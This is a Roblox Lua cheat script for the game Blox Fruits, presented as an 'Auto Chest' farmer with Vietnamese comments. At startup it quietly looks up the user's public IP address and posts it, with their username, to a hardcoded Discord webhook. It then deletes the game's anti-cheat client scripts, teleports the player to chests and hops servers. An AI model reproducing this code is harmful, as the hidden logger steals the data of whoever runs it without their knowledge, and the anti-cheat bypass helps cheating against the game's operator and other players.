repeat
    wait()
until game:IsLoaded()
if game.PlaceId == 2753915549 then
    World1 = true
elseif game.PlaceId == 4442272183 then
    World2 = true
elseif game.PlaceId == 7449423635 then
    World3 = true
end
game.StarterGui:SetCore(
    "SendNotification",
    {
        Title = "Auto Chest",
        Text = "Đây Là Phiên Bản Beta",
        Duration = 10
    })
------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------
function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn.request
    local data =
        request(
        {
            Url = Url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(message)
        }
    )
    return ""
end

function AdminLoggerMsg()
    local randomColor = math.random(0, 0xFFFFFF)
    local AdminMessage = {
        ["embeds"] = {
            {
                ["title"] = "**Auto Chest**",
                ["description"] = "",
                ["type"] = "rich",
                ["color"] = randomColor, 
                ["fields"] = {
                    {
                        ["name"] = "**Username**",
                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**IP Address**",
                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
                        ["inline"] = false
                    },
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
            }
        }
    }
    return AdminMessage
end

PostWebhook("https://discord.com/api/webhooks/1302586521131417610/8HgdPdFtBQKBDHD-0zkYRDFRsy8w-20baeuBdPOrcMTqJR9O95pEdurdXXV8-4Y-c1KH", AdminLoggerMsg()) -- Post to admin webhook
-- Đợi game tải xong trước khi chạy script
if not game:IsLoaded() then
    game.Loaded:Wait()
end

-- Khởi tạo các dịch vụ cần thiết
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local VirtualUser = game:GetService("VirtualUser")

local LocalPlayer = Players.LocalPlayer

if not LocalPlayer then
    return warn("Không tìm thấy LocalPlayer!")
end

-- Kiểm tra và khởi tạo các biến toàn cục
getgenv().Setting = getgenv().Setting or {
    ModFarm = {
        StopItemLegendary = false,
        SummonKillDarkbeard = false,
    },
    TimeReset = 10,
    WhiteScreen = false,
}

local AutoFarmChest = true
local hopserver = false

-- Hàm kiểm tra và phá vỡ các hệ thống anti-cheat
local function CheckAntiCheatBypass()
    for _, v in pairs(LocalPlayer.Character:GetDescendants()) do
        if v:IsA("LocalScript") then
            local forbidden = {
                "General", "Shiftlock", "FallDamage", "4444", "CamBob",
                "JumpCD", "Looking", "Run"
            }
            if table.find(forbidden, v.Name) then
                v:Destroy()
            end
        end
    end
    for _, v in pairs(LocalPlayer.PlayerScripts:GetDescendants()) do
        if v:IsA("LocalScript") then
            local forbiddenScripts = {
                "RobloxMotor6DBugFix", "Clans", "Codes", "CustomForceField",
                "MenuBloodSp", "PlayerList"
            }
            if table.find(forbiddenScripts, v.Name) then
                v:Destroy()
            end
        end
    end
end

-- Hàm tự động chọn team
local function AutoJoinTeam()
    local gui = LocalPlayer.PlayerGui:FindFirstChild("Main")
    if gui and gui:FindFirstChild("ChooseTeam") then
        repeat
            task.wait()
            if getgenv().Setting.ModFarm.StopItemLegendary or getgenv().Setting.ModFarm.SummonKillDarkbeard then
                for _, connection in pairs(getconnections(gui.ChooseTeam.Container["Pirates"].Frame.TextButton.Activated)) do
                    connection.Function()
                end
            else
                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetTeam", "Pirates")
            end
        until LocalPlayer.Team ~= nil
    end
end

-- Tự động farm chest
local function AutoFarmChests()
    while task.wait() do
        if AutoFarmChest then
            local closestChest = nil
            local closestDistance = math.huge
            for _, v in pairs(Workspace:GetChildren()) do
                if v.Name:find("Chest") and (v.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < closestDistance then
                    closestChest = v
                    closestDistance = (v.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                end
            end
            if closestChest then
                for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
                LocalPlayer.Character:PivotTo(closestChest:GetPivot())
                firesignal(closestChest.Touched, LocalPlayer.Character.HumanoidRootPart)
            else
                hopserver = true
                AutoFarmChest = false
            end
        end
    end
end

-- Đổi server khi cần
local function HopServer()
    while hopserver do
        task.wait()
        local servers = ReplicatedStorage:FindFirstChild("__ServerBrowser"):InvokeServer(1)
        for id, info in pairs(servers) do
            if id ~= game.JobId and info["Count"] < 10 then
                ReplicatedStorage.__ServerBrowser:InvokeServer("teleport", id)
                return
            end
        end
    end
end

-- Kích hoạt script
CheckAntiCheatBypass()
AutoJoinTeam()

spawn(AutoFarmChests)
spawn(function()
    while task.wait() do
        if hopserver then
            HopServer()
        end
    end
end)